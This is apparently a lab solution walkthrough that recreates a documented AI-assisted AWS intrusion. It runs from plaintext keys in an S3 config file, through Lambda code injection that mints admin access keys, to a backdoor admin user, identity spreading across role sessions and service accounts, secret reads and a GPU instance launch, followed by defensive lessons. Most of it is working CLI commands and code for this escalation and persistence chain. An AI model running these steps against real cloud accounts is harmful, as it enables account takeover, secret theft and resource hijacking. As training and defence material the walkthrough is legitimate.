# Solution: AI-Assisted Cloud Intrusion: 8 Minutes to Admin

On November 28, 2025, the Sysdig Threat Research Team observed a real attack against one of their customer environments. The attacker found exposed IAM credentials in a public S3 bucket — the kind of mistake that shows up in security awareness training slides — and within eight minutes had achieved full administrative access, created a backdoor account, invoked AI models, and launched a GPU instance for ML model training. All of this was accomplished with the help of an AI assistant that automated reconnaissance decisions, interpreted API errors, and suggested the next attack step in real time.

What made this attack remarkable was not any single technique. IAM credential theft from S3, Lambda code injection, and GPU instance hijacking are all known attack patterns with documented playbooks. What was new was the speed and automation. AI assistance collapsed the time between "I have credentials" and "I have admin" from hours to minutes by eliminating the research and troubleshooting steps that typically slow an attacker down. Techniques that required expertise to chain together could now be executed by someone following AI-generated instructions, iterating through failures in real time.

This lab recreates that attack chain in a self-contained environment. The credentials start in a private bucket (not public, to give you an explicit entry point), the GPU instance is downsized for cost, and cross-account movement attempts are simulated as failures. Everything else — the credential extraction, the Lambda injection, the two-phase injection with a decoy target, the backdoor creation, the Bedrock invocations, and the data collection — follows the original attack as documented by the Sysdig TRT team.

## The Challenge

You start with credentials for `pl-prod-8min-starting-user` — an IAM user with access to exactly one S3 bucket: a private store of RAG pipeline data. That bucket contains a configuration file with IAM credentials embedded in plaintext.

Your goal is to reach `pl-prod-8min-frick`, an IAM user with `AdministratorAccess`. The path runs through the S3 bucket, a second-stage IAM user with Lambda write access, and an over-privileged Lambda execution role that can create access keys for frick.

Set your starting credentials:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see `pl-prod-8min-starting-user`. Confirm the limited permissions:

```bash
aws iam list-users --max-items 1
# AccessDenied
aws lambda list-functions
# AccessDenied
```

Good. You can only touch S3.

## Reconnaissance

### Stage 1: The RAG Bucket

Start by listing the bucket. You know the bucket exists because your IAM policy explicitly names it — that alone is a clue about what to look for.

```bash
aws s3 ls s3://pl-prod-8min-rag-data-{account_id}-{suffix} --recursive
```

You will see several paths: document chunks, embeddings, and a `config/` directory. The config directory is what you want:

```
2025-11-28 07:43:12       4821 chunks/doc-001.txt
2025-11-28 07:43:12       2048 embeddings/index.bin
2025-11-28 07:43:12        892 config/rag-pipeline-config.json
```

Download the config file:

```bash
aws s3 cp s3://pl-prod-8min-rag-data-{account_id}-{suffix}/config/rag-pipeline-config.json /tmp/rag-pipeline-config.json
cat /tmp/rag-pipeline-config.json
```

Buried inside the pipeline authentication block are plaintext IAM credentials:

```json
{
  "pipeline_name": "rag-v2",
  "embedding_model": "amazon.titan-embed-text-v1",
  "pipeline_auth": {
    "aws_access_key_id": "AKIA...",
    "aws_secret_access_key": "..."
  }
}
```

A developer embedded these credentials directly in the config file rather than using AWS Secrets Manager or an IAM role. In the original attack, this file was in a public bucket. Here, it only requires the minimal starting credentials — but the root cause is identical.

Extract and set the new credentials:

```bash
NEW_KEY=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_access_key_id')
NEW_SECRET=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_secret_access_key')

export AWS_ACCESS_KEY_ID="$NEW_KEY"
export AWS_SECRET_ACCESS_KEY="$NEW_SECRET"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You are now `pl-prod-8min-compromised-user`.

### Stage 2: Mapping the Account

This is where the original attack demonstrated AI assistance most clearly. The AI processed API responses, identified which role assumptions would succeed or fail based on trust policy patterns, and directed the attacker toward the Lambda function as the escalation vector. You will do the same thing manually.

First, enumerate all IAM users:

```bash
aws iam list-users --query 'Users[*].[UserName,UserId]' --output table
```

You will see several users including `pl-prod-8min-frick`, `pl-prod-8min-admingh`, `pl-prod-8min-rocker`, `pl-prod-8min-azureadmanager`, `pl-prod-8min-deploy-svc`, `pl-prod-8min-monitoring`, and `pl-prod-8min-ci-runner`. The names are suggestive — frick sounds like an admin, rocker could have elevated access, azureadmanager suggests Azure AD integration. Check what frick has attached:

```bash
aws iam list-attached-user-policies --user-name pl-prod-8min-frick
```

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "AdministratorAccess",
      "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
    }
  ]
}
```

That is your target. Now enumerate Lambda functions:

```bash
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role]' \
  --output table
```

The `pl-prod-8min-ec2-init` function stands out because its execution role is named `pl-prod-8min-ec2-init-role`. Look at that role's inline policies:

```bash
aws iam get-role --role-name pl-prod-8min-ec2-init-role \
  --query 'Role.AssumeRolePolicyDocument'

aws iam list-role-policies --role-name pl-prod-8min-ec2-init-role
aws iam get-role-policy \
  --role-name pl-prod-8min-ec2-init-role \
  --policy-name ec2-init-policy
```

The role policy reveals `iam:CreateAccessKey` on `pl-prod-8min-frick` and `pl-prod-8min-admingh`. An EC2 initialization function with the ability to create IAM credentials is not just a misconfiguration — it is an unguarded privilege escalation path. Anyone who can update and invoke this function can create admin credentials.

Try some role assumptions to round out your reconnaissance. The original attacker's AI assistant tried generic role names first:

```bash
# These will fail
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/admin \
  --role-session-name test 2>&1

aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/Administrator \
  --role-session-name test 2>&1

# These will succeed (low-privilege roles, useful for recon)
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role \
  --role-session-name recon
```

The sysadmin, developer, and account roles all trust the compromised user and can be assumed. They are not on the path to admin — but they expand the reconnaissance surface.

## Exploitation

### Phase 1: Lambda Code Injection (First Attempt — Decoy Target)

The execution role has `iam:CreateAccessKey` on both `admingh` and `frick`. The original attacker tried `admingh` first, possibly because it appeared before `frick` in an IAM enumeration or because an AI assistant suggested it based on the username pattern.

Write a minimal Lambda handler that calls `iam.create_access_key()` on a configurable target:

```bash
cat > /tmp/lambda_payload.py << 'EOF'
import boto3
import os

def handler(event, context):
    target = os.environ.get('TARGET_USER', '')
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=target)
    key = response['AccessKey']
    return {
        'AccessKeyId': key['AccessKeyId'],
        'SecretAccessKey': key['SecretAccessKey'],
        'UserName': key['UserName']
    }
EOF

cd /tmp && zip lambda_payload.zip lambda_payload.py
```

Upload the malicious code:

```bash
aws lambda update-function-code \
  --function-name pl-prod-8min-ec2-init \
  --zip-file fileb:///tmp/lambda_payload.zip
```

Set the first target to `admingh`:

```bash
aws lambda update-function-configuration \
  --function-name pl-prod-8min-ec2-init \
  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'
```

Wait a few seconds for the update to propagate, then invoke:

```bash
aws lambda invoke \
  --function-name pl-prod-8min-ec2-init \
  --payload '{}' \
  /tmp/lambda_response_admingh.json

cat /tmp/lambda_response_admingh.json
```

The invocation succeeds. You receive an access key ID and secret for `pl-prod-8min-admingh`. Test them:

```bash
export AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_admingh.json | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_admingh.json | jq -r '.SecretAccessKey')
unset AWS_SESSION_TOKEN

aws iam list-users --max-items 1
# AccessDenied
```

`admingh` is a decoy with no useful permissions. The original attacker hit the same wall, recognized the failure (with AI assistance interpreting the error), and retargeted.

Switch back to the compromised user credentials before continuing:

```bash
export AWS_ACCESS_KEY_ID="$NEW_KEY"
export AWS_SECRET_ACCESS_KEY="$NEW_SECRET"
unset AWS_SESSION_TOKEN
```

### Phase 2: Lambda Code Injection (Second Attempt — Admin Target)

The code is already uploaded. All you need is to update the environment variable to point at `frick`:

```bash
aws lambda update-function-configuration \
  --function-name pl-prod-8min-ec2-init \
  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'

aws lambda invoke \
  --function-name pl-prod-8min-ec2-init \
  --payload '{}' \
  /tmp/lambda_response_frick.json

cat /tmp/lambda_response_frick.json
```

This time the response contains access keys for `pl-prod-8min-frick`.

### Reaching Admin

Configure frick's credentials:

```bash
export AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_frick.json | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_frick.json | jq -r '.SecretAccessKey')
unset AWS_SESSION_TOKEN
```

## Verification

Confirm the admin identity:

```bash
aws sts get-caller-identity
aws iam list-users --output table
```

You are now operating as `pl-prod-8min-frick` with `AdministratorAccess`. Everything that follows replicates the original attacker's post-escalation activity.

**Create a persistent backdoor:**

```bash
aws iam create-user --user-name backdoor-admin

aws iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam create-access-key --user-name backdoor-admin
```

The original attack created this backdoor within the first minute of admin access. Even if frick's access keys are later rotated or deactivated, the backdoor user persists.

**Identity spreading — role assumptions:**

The original attacker assumed six IAM roles across 14 sessions, distributing activity across multiple identities to complicate tracking. With admin access, assume every available role using different session names:

```bash
# Assume roles with varied session names — each creates a unique principal in CloudTrail
for ROLE in sysadmin account netadmin; do
  for SESSION in explore test pwned; do
    aws sts assume-role \
      --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-${ROLE}-role \
      --role-session-name $SESSION > /dev/null 2>&1 \
      && echo "Assumed ${ROLE}-role (session: $SESSION)"
  done
done

aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role \
  --role-session-name escalation > /dev/null 2>&1

for ROLE in developer external; do
  aws sts assume-role \
    --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-${ROLE}-role \
    --role-session-name test > /dev/null 2>&1 \
    && echo "Assumed ${ROLE}-role (session: test)"
done
```

That is 12 role assumption sessions across 5 roles. Each session appears as a separate principal in CloudTrail (e.g., `arn:aws:sts::{account_id}:assumed-role/pl-prod-8min-sysadmin-role/explore`), forcing incident responders to correlate activity across many identities.

**Identity spreading — access key creation for pre-existing users:**

The attacker also takes over pre-existing service accounts by creating access keys for them. This is harder to detect than creating new users because the accounts already have established activity patterns:

```bash
aws iam create-access-key --user-name pl-prod-8min-rocker
aws iam create-access-key --user-name pl-prod-8min-azureadmanager
aws iam create-access-key --user-name pl-prod-8min-deploy-svc
aws iam create-access-key --user-name pl-prod-8min-monitoring
aws iam create-access-key --user-name pl-prod-8min-ci-runner
```

Now the attacker has credentials for 5 pre-existing users plus the backdoor-admin they are about to create. Combined with the 12 role sessions, that is 19 unique AWS principals under attacker control. Only one needs to survive incident response for the attacker to maintain access.

Check whether Bedrock logging is active (the original attacker did this before invoking models):

```bash
aws bedrock get-model-invocation-logging-configuration
```

If logging is not configured, `InvokeModel` calls leave no record in CloudTrail. Invoke three models:

```bash
# Claude Haiku
aws bedrock-runtime invoke-model \
  --model-id anthropic.claude-haiku-20240307-v1:0 \
  --body '{"anthropic_version":"bedrock-2023-05-31","max_tokens":100,"messages":[{"role":"user","content":"What is AWS IAM?"}]}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/bedrock_haiku.json

# Amazon Nova Lite
aws bedrock-runtime invoke-model \
  --model-id amazon.nova-lite-v1:0 \
  --body '{"messages":[{"role":"user","content":[{"text":"What is AWS IAM?"}]}]}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/bedrock_nova.json

# DeepSeek R1
aws bedrock-runtime invoke-model \
  --model-id us.deepseek.r1-v1:0 \
  --body '{"messages":[{"role":"user","content":"What is AWS IAM?"}]}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/bedrock_deepseek.json
```

**Cross-account movement (all fail):**

The original attacker's AI assistant generated several cross-account role ARNs based on patterns found during reconnaissance. Every attempt returned `AccessDenied` — either because the accounts did not exist or the roles did not trust the attacker.

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/OrganizationAccountAccessRole \
  --role-session-name cross-account-attempt 2>&1
# AccessDenied

aws sts assume-role \
  --role-arn arn:aws:iam::098765432109:role/admin \
  --role-session-name cross-account-attempt 2>&1
# AccessDenied
```

**Data collection:**

```bash
aws secretsmanager get-secret-value \
  --secret-id pl-prod-8min-db-credentials \
  --query 'SecretString'

aws ssm get-parameter \
  --name /pl/8min/api-key \
  --with-decryption \
  --query 'Parameter.Value'

aws lambda get-function \
  --function-name pl-prod-8min-ec2-init \
  --query 'Code.Location'
```

**GPU instance launch:**

```bash
aws ec2 create-key-pair \
  --key-name pl-8min-attack-key \
  --query 'KeyMaterial' \
  --output text > /tmp/pl-8min-attack-key.pem

chmod 400 /tmp/pl-8min-attack-key.pem

SG_ID=$(aws ec2 create-security-group \
  --group-name pl-8min-attack-sg \
  --description 'Attack GPU instance SG' \
  --query 'GroupId' \
  --output text)

aws ec2 authorize-security-group-ingress \
  --group-id "$SG_ID" \
  --protocol tcp \
  --port 22 \
  --cidr 0.0.0.0/0

# User data: #!/bin/bash\nshutdown -h +120 (base64 encoded)
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type p3.2xlarge \
  --key-name pl-8min-attack-key \
  --security-group-ids "$SG_ID" \
  --user-data 'IyEvYmluL2Jhc2gKc2h1dGRvd24gLWggKzEyMA==' \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu}]'
```

> **Stop here and run cleanup.** The p3.2xlarge costs $3.06/hr and the 2-hour auto-shutdown is a last resort, not a plan.

```bash
plabs cleanup sysdig-8-minutes-to-admin
```

## What Happened

You started with a single IAM user that could read one S3 bucket. Inside that bucket was a plaintext credential embedded in a pipeline config file — a developer shortcut that bypassed the credential management tooling entirely. Those embedded credentials belonged to a service account that had write access to a Lambda function. That Lambda function had an execution role that could create IAM credentials for an admin user.

Three misconfigurations stacked on top of each other: credentials in files, over-permissioned Lambda execution role, and write access to a production Lambda for an application service account. None of these findings is catastrophic in isolation. Together, they form a reliable path from a single leaked key to full account compromise.

Once inside, the attacker spread across the account's identity landscape — assuming 5 IAM roles across 12 sessions with varied session names, and creating access keys for 5 pre-existing service accounts, plus a newly created backdoor admin user. The original Sysdig blog documented 19 unique AWS principals under attacker control. This identity spreading technique serves two purposes: it makes detection harder because CloudTrail activity is distributed across many principals, and it ensures persistence because the defender must revoke every single compromised identity to fully evict the attacker. Missing even one means the attacker retains access.

What the original attack added to this familiar chain was AI assistance. An AI assistant processed each API response, identified the Lambda injection opportunity, recognized that `admingh` was a dead end after the first failed escalation, and pivoted to `frick` without human deliberation. That decision cycle — which historically took an experienced attacker minutes of manual analysis — collapsed to seconds. Eight minutes from initial access to admin. The techniques were old; the speed was new.

The defense is not complicated: scan S3 objects for secrets (Macie), remove `iam:CreateAccessKey` from Lambda execution roles that have no credential rotation purpose (IAM Access Analyzer), restrict `lambda:UpdateFunctionCode` to deployment pipelines only, enforce access key rotation and maximum key age on service accounts, and monitor for bursts of `sts:AssumeRole` and `iam:CreateAccessKey` calls from a single principal. Any one of the first three controls would have broken the escalation chain. The last two would have limited the blast radius of the identity spreading.
